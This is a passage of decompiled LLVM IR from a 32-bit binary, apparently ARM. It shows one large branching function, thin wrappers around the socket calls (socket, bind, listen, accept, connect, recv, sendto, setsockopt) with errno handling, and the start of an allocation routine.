  %v2_f514 = add i32 %v1_f514, 4
  %v3_f514 = inttoptr i32 %v2_f514 to i32*
  store i32 %v0_f514, i32* %v3_f514, align 4
  %tmp33 = icmp ult i32 %v1_f500, 32
  br i1 %tmp33, label %dec_label_pc_f774, label %dec_label_pc_f51c

dec_label_pc_f51c:                                ; preds = %dec_label_pc_f500
  %v0_f51c = load i32, i32* @r4, align 4
  %v1_f51c = add i32 %v0_f51c, -44
  store i32 %v1_f51c, i32* @r8, align 4
  %tmp34 = icmp ult i32 %v1_f51c, 256
  br i1 %tmp34, label %dec_label_pc_f774, label %dec_label_pc_f528

dec_label_pc_f528:                                ; preds = %dec_label_pc_f51c
  %v0_f528 = load i32, i32* @r7, align 4
  %v1_f528 = add i32 %v0_f528, 44
  store i32 %v1_f528, i32* @r6, align 4
  %v1_f52c = add i32 %v0_f528, 12
  store i32 %v1_f52c, i32* %r3.global-to-local, align 4
  %v0_f530 = load i32, i32* @fp, align 4
  store i32 %v0_f530, i32* @r1, align 4
  store i32 %v1_f51c, i32* %r2.global-to-local, align 4
  store i32 %v1_f528, i32* %r0.global-to-local, align 4
  %v3_f540 = call i32 @function_ee60(i32 %v1_f528, i32 %v0_f530, i32 %v1_f51c)
  store i32 %v1_f52c, i32* %ip.global-to-local, align 4
  %v0_f548 = load i32, i32* @r6, align 4
  %v1_f548 = load i32, i32* @r7, align 4
  %v2_f548 = add i32 %v1_f548, 12
  %v3_f548 = inttoptr i32 %v2_f548 to i32*
  store i32 %v0_f548, i32* %v3_f548, align 4
  %v0_f54c = load i32, i32* @fp, align 4
  store i32 %v0_f54c, i32* %r0.global-to-local, align 4
  %v0_f550 = load i32, i32* @r5, align 4
  %v1_f550 = load i32, i32* %ip.global-to-local, align 4
  %v2_f550 = add i32 %v1_f550, 4
  %v3_f550 = inttoptr i32 %v2_f550 to i32*
  store i32 %v0_f550, i32* %v3_f550, align 4
  %v0_f554 = load i32, i32* @r7, align 4
  %v2_f558 = inttoptr i32 %v0_f54c to i8*
  %v3_f558 = call i32 @function_126e4(i8* %v2_f558, i32 %v0_f554)
  store i32 %v3_f558, i32* %r0.global-to-local, align 4
  %v2_f55c = icmp eq i32 %v3_f558, 0
  br i1 %v2_f55c, label %dec_label_pc_f5a0, label %dec_label_pc_f568

dec_label_pc_f568:                                ; preds = %dec_label_pc_f528
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_f56c = load i32, i32* @sl, align 4
  %v2_f56c = add i32 %v1_f56c, 8
  %v3_f56c = inttoptr i32 %v2_f56c to i32*
  store i32 2, i32* %v3_f56c, align 4
  %v0_f570 = load i32, i32* %r3.global-to-local, align 4
  %v2_f570 = mul i32 %v0_f570, 2
  %v1_f574 = load i32, i32* @sl, align 4
  %v2_f574 = add i32 %v1_f574, 12
  %v3_f574 = inttoptr i32 %v2_f574 to i32*
  store i32 %v2_f570, i32* %v3_f574, align 4
  %v3_f578 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_f578, i32* %r2.global-to-local, align 4
  store i32 %v1_f52c, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  %v0_f584 = load i32, i32* @r5, align 4
  store i32 %v0_f584, i32* %r0.global-to-local, align 4
  %v0_f588 = load i32, i32* @sl, align 4
  %v2_f588 = inttoptr i32 %v3_f578 to i32*
  store i32 %v0_f588, i32* %v2_f588, align 4
  %v0_f58c = load i32, i32* @r6, align 4
  %v1_f58c = load i32, i32* @sl, align 4
  %v2_f58c = inttoptr i32 %v1_f58c to i32*
  store i32 %v0_f58c, i32* %v2_f58c, align 4
  %v0_f590 = load i32, i32* @sb, align 4
  %v1_f590 = load i32, i32* @sl, align 4
  %v2_f590 = add i32 %v1_f590, 16
  %v3_f590 = inttoptr i32 %v2_f590 to i32*
  store i32 %v0_f590, i32* %v3_f590, align 4
  %v0_f594 = load i32, i32* %r3.global-to-local, align 4
  %v1_f594 = load i32, i32* @sl, align 4
  %v2_f594 = add i32 %v1_f594, 4
  %v3_f594 = inttoptr i32 %v2_f594 to i32*
  store i32 %v0_f594, i32* %v3_f594, align 4
  %v0_f598 = load i32, i32* @r5, align 4
  %v1_f598 = load i32, i32* %ip.global-to-local, align 4
  %v2_f598 = inttoptr i32 %v1_f598 to i32*
  store i32 %v0_f598, i32* %v2_f598, align 4
  br label %dec_label_pc_f778

dec_label_pc_f5a0:                                ; preds = %dec_label_pc_f528
  %v2_f5a0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_f5a0, i32* @r5, align 4
  %v1_f5a4 = call i32 @function_12fdc(i32 0)
  store i32 ptrtoint (i32* @global_var_18438.413 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_f5a0, i32* @r0, align 4
  store i32 67648, i32* %r3.global-to-local, align 4
  %v1_f5bc = call i32 @function_10840()
  store i32 ptrtoint (i8* @global_var_10838.270 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18438.413 to i32), i32* %r0.global-to-local, align 4
  %v1_f5cc = call i32 @function_10838()
  store i32 %v2_f5a0, i32* @r0, align 4
  %v2_f5d8 = load i32, i32* @global_var_1ad44.418, align 4
  store i32 %v2_f5d8, i32* @r4, align 4
  store i32 67648, i32* %r3.global-to-local, align 4
  %v1_f5e8 = call i32 @function_10840()
  %v2_f5f4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_1ad38.421 to i32), i32* %r3.global-to-local, align 4
  %v0_f600 = load i32, i32* @fp, align 4
  store i32 %v0_f600, i32* %r0.global-to-local, align 4
  %v2_f604 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_f604, i32* %ip.global-to-local, align 4
  %v0_f608 = load i32, i32* @r4, align 4
  store i32 %v0_f608, i32* %r2.global-to-local, align 4
  %v6_f61c = inttoptr i32 %v0_f600 to i8*
  %v7_f61c = call i32 @function_127d0(i8* %v6_f61c, i32 1, i32 %v0_f608, i32 ptrtoint (i32* @global_var_1ad38.421 to i32), i32 %v2_f5f4, i32 %v2_f604)
  store i32 %v7_f61c, i32* %r0.global-to-local, align 4
  %v1_f620 = icmp slt i32 %v7_f61c, 0
  br i1 %v1_f620, label %.dec_label_pc_f74c_crit_edge, label %dec_label_pc_f630

.dec_label_pc_f74c_crit_edge:                     ; preds = %dec_label_pc_f5a0
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f74c

dec_label_pc_f630:                                ; preds = %dec_label_pc_f5a0
  store i32 256, i32* %r3.global-to-local, align 4
  %v1_f644 = load i32, i32* @r8, align 4
  %tmp35 = icmp ugt i32 %v1_f644, 255
  br i1 %tmp35, label %dec_label_pc_f6e0, label %dec_label_pc_f64c

dec_label_pc_f64c:                                ; preds = %dec_label_pc_f630
  %v3_f64c = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_f64c, i32* %r0.global-to-local, align 4
  %v1_f650 = call i32 @function_fa5c(i32 %v3_f64c)
  %v3_f654 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_f654, i32* %r0.global-to-local, align 4
  %v1_f658 = call i32 @function_fa5c(i32 %v3_f654)
  store i32 %arg6, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 34, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %v1_f498, align 4
  br label %dec_label_pc_f778

dec_label_pc_f6e0:                                ; preds = %dec_label_pc_f630
  %v3_f6e4.pre = load i32, i32* %stack_var_-96, align 4
  %v0_f6e8.pre = load i32, i32* @r6, align 4
  store i32 %v1_f644, i32* %r2.global-to-local, align 4
  store i32 %v3_f6e4.pre, i32* @r1, align 4
  store i32 %v0_f6e8.pre, i32* %r0.global-to-local, align 4
  %v3_f6ec = call i32 @function_ee60(i32 %v0_f6e8.pre, i32 %v3_f6e4.pre, i32 %v1_f644)
  %v3_f6f0 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_f6f0, i32* %r0.global-to-local, align 4
  %v1_f6f4 = call i32 @function_fa5c(i32 %v3_f6f0)
  store i32 %v1_f6f4, i32* %r0.global-to-local, align 4
  store i32 %tmp7, i32* %r3.global-to-local, align 4
  %v7_f6fc = icmp eq i32 %tmp7, 1
  br i1 %v7_f6fc, label %dec_label_pc_f704, label %dec_label_pc_f758

dec_label_pc_f704:                                ; preds = %dec_label_pc_f6e0
  store i32 4, i32* @r2, align 4
  %v0_f70c = load i32, i32* @r7, align 4
  store i32 %v0_f70c, i32* @r0, align 4
  %v0_f710 = call i32 @function_ec10()
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v1_f52c, i32* %r2.global-to-local, align 4
  %v1_f71c = load i32, i32* @sl, align 4
  %v2_f71c = add i32 %v1_f71c, 8
  %v3_f71c = inttoptr i32 %v2_f71c to i32*
  store i32 2, i32* %v3_f71c, align 4
  %v0_f720 = load i32, i32* %r3.global-to-local, align 4
  %v2_f720 = mul i32 %v0_f720, 2
  store i32 %v2_f720, i32* %r3.global-to-local, align 4
  %v1_f724 = load i32, i32* @sl, align 4
  %v2_f724 = add i32 %v1_f724, 12
  %v3_f724 = inttoptr i32 %v2_f724 to i32*
  store i32 %v2_f720, i32* %v3_f724, align 4
  %v3_f728 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_f728, i32* %r0.global-to-local, align 4
  %v0_f72c = load i32, i32* @r6, align 4
  %v1_f72c = load i32, i32* @sl, align 4
  %v2_f72c = inttoptr i32 %v1_f72c to i32*
  store i32 %v0_f72c, i32* %v2_f72c, align 4
  %v0_f730 = load i32, i32* @sb, align 4
  %v1_f730 = load i32, i32* @sl, align 4
  %v2_f730 = add i32 %v1_f730, 16
  %v3_f730 = inttoptr i32 %v2_f730 to i32*
  store i32 %v0_f730, i32* %v3_f730, align 4
  %v0_f734 = load i32, i32* %r2.global-to-local, align 4
  %v1_f734 = load i32, i32* @sl, align 4
  %v2_f734 = add i32 %v1_f734, 4
  %v3_f734 = inttoptr i32 %v2_f734 to i32*
  store i32 %v0_f734, i32* %v3_f734, align 4
  %v1_f738 = call i32 @function_fa5c(i32 %v3_f728)
  %v3_f73c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_f73c, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_f744 = load i32, i32* @sl, align 4
  %v2_f744 = inttoptr i32 %v3_f73c to i32*
  store i32 %v0_f744, i32* %v2_f744, align 4
  %v0_f748 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_f748, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f74c

dec_label_pc_f74c:                                ; preds = %.dec_label_pc_f74c_crit_edge, %dec_label_pc_f704
  %v0_f750 = phi i32 [ 1, %.dec_label_pc_f74c_crit_edge ], [ %v0_f748, %dec_label_pc_f704 ]
  store i32 %arg6, i32* %r2.global-to-local, align 4
  store i32 %v0_f750, i32* %v1_f498, align 4
  br label %dec_label_pc_f778

dec_label_pc_f758:                                ; preds = %dec_label_pc_f6e0
  %v3_f758 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_f758, i32* %r0.global-to-local, align 4
  %v1_f75c = call i32 @function_fa5c(i32 %v3_f758)
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %v1_f498, align 4
  br label %dec_label_pc_f778

dec_label_pc_f774:                                ; preds = %dec_label_pc_f4d0, %dec_label_pc_f51c, %dec_label_pc_f500, %dec_label_pc_f4f4, %dec_label_pc_f4e0
  store i32 34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f778

dec_label_pc_f778:                                ; preds = %bb, %dec_label_pc_f4b4, %dec_label_pc_f4ac, %dec_label_pc_f454, %dec_label_pc_f758, %dec_label_pc_f74c, %dec_label_pc_f64c, %dec_label_pc_f568, %dec_label_pc_f774
  store i32 %v6_f428, i32* @r5, align 4
  store i32 %v9_f428, i32* @r6, align 4
  store i32 %v12_f428, i32* @r7, align 4
  store i32 %v15_f428, i32* @r8, align 4
  store i32 %v18_f428, i32* @sb, align 4
  store i32 %v21_f428, i32* @sl, align 4
  store i32 %v24_f428, i32* @fp, align 4
  %v29_f77c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v29_f77c

; uselistorder directives
  uselistorder i32 %v2_f720, { 1, 0 }
  uselistorder i32 %v1_f644, { 1, 2, 0 }
  uselistorder i32 %v1_f52c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_f528, { 1, 0, 2 }
  uselistorder i32 %v1_f51c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_f4e8.pre, { 0, 2, 1 }
  uselistorder i32 %v1_f4c4, { 1, 0 }
  uselistorder i32* %v1_f498, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_f438, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r0.global-to-local, { 24, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 26, 15, 16, 17, 19, 18, 20, 25, 21, 23, 22, 0, 1, 2 }
  uselistorder i32 %arg6, { 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_f778, { 8, 4, 5, 6, 7, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_f774, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_f74c, { 1, 0 }
  uselistorder label %dec_label_pc_f4e0, { 1, 0 }
}

define i32 @function_f79c(i32 %arg1, %sockaddr* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_f79c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f79c = load i32, i32* @r4, align 4
  store i32 %v3_f79c, i32* %stack_var_-8, align 4
  %v5_f7a0 = inttoptr i32 %arg3 to i32*
  %v6_f7a0 = call i32 @accept(i32 %arg1, %sockaddr* %arg2, i32* %v5_f7a0)
  store i32 %v6_f7a0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v6_f7a0, -4095
  br i1 %tmp, label %dec_label_pc_f7c0, label %dec_label_pc_f7b0

dec_label_pc_f7b0:                                ; preds = %dec_label_pc_f79c
  %v0_f7b0 = call i32 @function_cc08()
  %v0_f7b4 = load i32, i32* %r4.global-to-local, align 4
  %v1_f7b4 = sub i32 0, %v0_f7b4
  %v2_f7b8 = inttoptr i32 %v0_f7b0 to i32*
  store i32 %v1_f7b4, i32* %v2_f7b8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f7c0

dec_label_pc_f7c0:                                ; preds = %dec_label_pc_f79c, %dec_label_pc_f7b0
  %v0_f7c0 = phi i32 [ %v6_f7a0, %dec_label_pc_f79c ], [ -1, %dec_label_pc_f7b0 ]
  %v2_f7c4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f7c4, i32* @r4, align 4
  ret i32 %v0_f7c0

; uselistorder directives
  uselistorder i32 %v6_f7a0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f7c0, { 1, 0 }
}

define i32 @function_f7c8(i32 %arg1, %sockaddr* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
dec_label_pc_f7c8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f7c8 = load i32, i32* @r4, align 4
  store i32 %v3_f7c8, i32* %stack_var_-8, align 4
  %v5_f7cc = call i32 @bind(i32 %arg1, %sockaddr* %arg2, i32 %arg3)
  store i32 %v5_f7cc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_f7cc, -4095
  br i1 %tmp, label %dec_label_pc_f7ec, label %dec_label_pc_f7dc

dec_label_pc_f7dc:                                ; preds = %dec_label_pc_f7c8
  %v0_f7dc = call i32 @function_cc08()
  %v0_f7e0 = load i32, i32* %r4.global-to-local, align 4
  %v1_f7e0 = sub i32 0, %v0_f7e0
  %v2_f7e4 = inttoptr i32 %v0_f7dc to i32*
  store i32 %v1_f7e0, i32* %v2_f7e4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f7ec

dec_label_pc_f7ec:                                ; preds = %dec_label_pc_f7c8, %dec_label_pc_f7dc
  %v0_f7ec = phi i32 [ %v5_f7cc, %dec_label_pc_f7c8 ], [ -1, %dec_label_pc_f7dc ]
  %v2_f7f0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f7f0, i32* @r4, align 4
  ret i32 %v0_f7ec

; uselistorder directives
  uselistorder i32 %v5_f7cc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f7ec, { 1, 0 }
}

define i32 @function_f7f4(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_f7f4:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f7f4 = load i32, i32* @r4, align 4
  store i32 %v3_f7f4, i32* %stack_var_-8, align 4
  %v5_f7f8 = call i32 @connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3)
  store i32 %v5_f7f8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_f7f8, -4095
  br i1 %tmp, label %dec_label_pc_f818, label %dec_label_pc_f808

dec_label_pc_f808:                                ; preds = %dec_label_pc_f7f4
  %v0_f808 = call i32 @function_cc08()
  %v0_f80c = load i32, i32* %r4.global-to-local, align 4
  %v1_f80c = sub i32 0, %v0_f80c
  %v2_f810 = inttoptr i32 %v0_f808 to i32*
  store i32 %v1_f80c, i32* %v2_f810, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f818

dec_label_pc_f818:                                ; preds = %dec_label_pc_f7f4, %dec_label_pc_f808
  %v0_f818 = phi i32 [ %v5_f7f8, %dec_label_pc_f7f4 ], [ -1, %dec_label_pc_f808 ]
  %v2_f81c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f81c, i32* @r4, align 4
  ret i32 %v0_f818

; uselistorder directives
  uselistorder i32 %v5_f7f8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f818, { 1, 0 }
}

define i32 @function_f820(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f820:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f820 = load i32, i32* @r4, align 4
  store i32 %v3_f820, i32* %stack_var_-8, align 4
  %v2_f824 = call i32 @listen(i32 %arg1, i32 %arg2)
  store i32 %v2_f824, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_f824, -4095
  br i1 %tmp, label %dec_label_pc_f844, label %dec_label_pc_f834

dec_label_pc_f834:                                ; preds = %dec_label_pc_f820
  %v0_f834 = call i32 @function_cc08()
  %v0_f838 = load i32, i32* %r4.global-to-local, align 4
  %v1_f838 = sub i32 0, %v0_f838
  %v2_f83c = inttoptr i32 %v0_f834 to i32*
  store i32 %v1_f838, i32* %v2_f83c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f844

dec_label_pc_f844:                                ; preds = %dec_label_pc_f820, %dec_label_pc_f834
  %v0_f844 = phi i32 [ %v2_f824, %dec_label_pc_f820 ], [ -1, %dec_label_pc_f834 ]
  %v2_f848 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f848, i32* @r4, align 4
  ret i32 %v0_f844

; uselistorder directives
  uselistorder i32 %v2_f824, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f844, { 1, 0 }
}

define i32 @function_f84c(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_f84c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f84c = load i32, i32* @r4, align 4
  store i32 %v3_f84c, i32* %stack_var_-8, align 4
  %v5_f850 = call i32 @recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_f850, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_f850, -4095
  br i1 %tmp, label %dec_label_pc_f870, label %dec_label_pc_f860

dec_label_pc_f860:                                ; preds = %dec_label_pc_f84c
  %v0_f860 = call i32 @function_cc08()
  %v0_f864 = load i32, i32* %r4.global-to-local, align 4
  %v1_f864 = sub i32 0, %v0_f864
  %v2_f868 = inttoptr i32 %v0_f860 to i32*
  store i32 %v1_f864, i32* %v2_f868, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f870

dec_label_pc_f870:                                ; preds = %dec_label_pc_f84c, %dec_label_pc_f860
  %v0_f870 = phi i32 [ %v5_f850, %dec_label_pc_f84c ], [ -1, %dec_label_pc_f860 ]
  %v2_f874 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f874, i32* @r4, align 4
  ret i32 %v0_f870

; uselistorder directives
  uselistorder i32 %v5_f850, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f870, { 1, 0 }
}

define i32 @function_f878(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_f878:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_f878 = load i32, i32* @r4, align 4
  store i32 %v3_f878, i32* %stack_var_-12, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_f884 = call i32 @sendto(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, %sockaddr* null, i32 0)
  store i32 %v5_f884, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_f884, -4095
  br i1 %tmp, label %dec_label_pc_f8a4, label %dec_label_pc_f894

dec_label_pc_f894:                                ; preds = %dec_label_pc_f878
  %v0_f894 = call i32 @function_cc08()
  %v0_f898 = load i32, i32* %r4.global-to-local, align 4
  %v1_f898 = sub i32 0, %v0_f898
  %v2_f89c = inttoptr i32 %v0_f894 to i32*
  store i32 %v1_f898, i32* %v2_f89c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f8a4

dec_label_pc_f8a4:                                ; preds = %dec_label_pc_f878, %dec_label_pc_f894
  %v0_f8a4 = phi i32 [ %v5_f884, %dec_label_pc_f878 ], [ -1, %dec_label_pc_f894 ]
  %v2_f8a8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_f8a8, i32* @r4, align 4
  ret i32 %v0_f8a4

; uselistorder directives
  uselistorder i32 %v5_f884, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f8a4, { 1, 0 }
}

define i32 @function_f8ac(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_f8ac:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f8ac = load i32, i32* @r4, align 4
  store i32 %v3_f8ac, i32* %stack_var_-8, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_f8b4 = call i32 @setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 0)
  store i32 %v5_f8b4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_f8b4, -4095
  br i1 %tmp, label %dec_label_pc_f8d4, label %dec_label_pc_f8c4

dec_label_pc_f8c4:                                ; preds = %dec_label_pc_f8ac
  %v0_f8c4 = call i32 @function_cc08()
  %v0_f8c8 = load i32, i32* %r4.global-to-local, align 4
  %v1_f8c8 = sub i32 0, %v0_f8c8
  %v2_f8cc = inttoptr i32 %v0_f8c4 to i32*
  store i32 %v1_f8c8, i32* %v2_f8cc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f8d4

dec_label_pc_f8d4:                                ; preds = %dec_label_pc_f8ac, %dec_label_pc_f8c4
  %v0_f8d4 = phi i32 [ %v5_f8b4, %dec_label_pc_f8ac ], [ -1, %dec_label_pc_f8c4 ]
  %v2_f8d8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f8d8, i32* @r4, align 4
  ret i32 %v0_f8d4

; uselistorder directives
  uselistorder i32 %v5_f8b4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f8d4, { 1, 0 }
}

define i32 @function_f8dc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_f8dc:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f8dc = load i32, i32* @r4, align 4
  store i32 %v3_f8dc, i32* %stack_var_-8, align 4
  %v3_f8e0 = call i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %v3_f8e0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_f8e0, -4095
  br i1 %tmp, label %dec_label_pc_f900, label %dec_label_pc_f8f0

dec_label_pc_f8f0:                                ; preds = %dec_label_pc_f8dc
  %v0_f8f0 = call i32 @function_cc08()
  %v0_f8f4 = load i32, i32* %r4.global-to-local, align 4
  %v1_f8f4 = sub i32 0, %v0_f8f4
  %v2_f8f8 = inttoptr i32 %v0_f8f0 to i32*
  store i32 %v1_f8f4, i32* %v2_f8f8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f900

dec_label_pc_f900:                                ; preds = %dec_label_pc_f8dc, %dec_label_pc_f8f0
  %v0_f900 = phi i32 [ %v3_f8e0, %dec_label_pc_f8dc ], [ -1, %dec_label_pc_f8f0 ]
  %v2_f904 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f904, i32* @r4, align 4
  ret i32 %v0_f900

; uselistorder directives
  uselistorder i32 %v3_f8e0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f900, { 1, 0 }
}

define i32 @function_f908(i32 %arg1) local_unnamed_addr {
dec_label_pc_f908:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_f908 = load i32, i32* @r4, align 4
  %v6_f908 = load i32, i32* @r5, align 4
  %v9_f908 = load i32, i32* @r6, align 4
  %v0_f90c = load i32, i32* %r0.global-to-local, align 4
  %v2_f90c = icmp eq i32 %v0_f90c, 0
  %v2_f910 = ptrtoint i32* %stack_var_-20 to i32
  br i1 %v2_f90c, label %bb, label %dec_label_pc_f91c

bb:                                               ; preds = %dec_label_pc_f908
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f924

dec_label_pc_f91c:                                ; preds = %dec_label_pc_f908
  %tmp = icmp ugt i32 %v0_f90c, -8
  br i1 %tmp, label %dec_label_pc_fa28, label %dec_label_pc_f924

dec_label_pc_f924:                                ; preds = %bb, %dec_label_pc_f91c
  %v0_f924 = phi i32 [ %v0_f90c, %dec_label_pc_f91c ], [ 1, %bb ]
  %v1_f924 = add i32 %v0_f924, 4
  store i32 %v1_f924, i32* %stack_var_-20, align 4
  store i32 %v2_f910, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1aa90.423 to i32), i32* %r0.global-to-local, align 4
  %v1_f93c = call i32 @function_10838()
  store i32 ptrtoint (i32** @global_var_18234.427 to i32), i32* %r0.global-to-local, align 4
  %v3_f948 = call i32 @function_fb4c(i32* bitcast (i32** @global_var_18234.427 to i32*), i32 %v2_f910)
  store i32 %v3_f948, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1aa90.423 to i32), i32* %r0.global-to-local, align 4
  store i32 63840, i32* @lr, align 4
  %v1_f95c = call i32 @function_10838()
  store i32 %v1_f95c, i32* %r0.global-to-local, align 4
  %v2_f960 = icmp eq i32 %v3_f948, 0
  br i1 %v2_f960, label %dec_label_pc_f968, label %dec_label_pc_fa18

dec_label_pc_f968:                                ; preds = %dec_label_pc_f924
  %v2_f96c = load i32, i32* @global_var_1aab8.430, align 4
  store i32 %v2_f96c, i32* @r4, align 4
  %v2_f970 = load i32, i32* %stack_var_-20, align 4
  %v3_f974 = icmp ult i32 %v2_f970, %v2_f96c
  br i1 %v3_f974, label %.thread3, label %bb14

bb14:                                             ; preds = %dec_label_pc_f968
  %v3_f978 = add i32 %v2_f96c, -1
  %v2_f97c = add i32 %v3_f978, %v2_f970
  %v2_f980 = sub i32 0, %v2_f96c
  %v3_f984 = and i32 %v2_f97c, %v2_f980
  store i32 %v3_f984, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_f968, %bb14
  store i32 ptrtoint (i32* @global_var_1ad10.432 to i32), i32* %r0.global-to-local, align 4
  %v1_f990 = call i32 @function_10838()
  %v0_f994 = load i32, i32* @r4, align 4
  store i32 %v0_f994, i32* %r0.global-to-local, align 4
  %v1_f998 = call i32 @function_10f2c(i32 %v0_f994)
  store i32 %v1_f998, i32* %r0.global-to-local, align 4
  %v7_f99c = icmp eq i32 %v1_f998, -1
  br i1 %v7_f99c, label %bb15, label %dec_label_pc_f9a8

bb15:                                             ; preds = %.thread3
  store i32 %v1_f998, i32* @r5, align 4
  br label %dec_label_pc_f9bc

dec_label_pc_f9a8:                                ; preds = %.thread3
  %v1_f9a8 = add i32 %v1_f998, 3
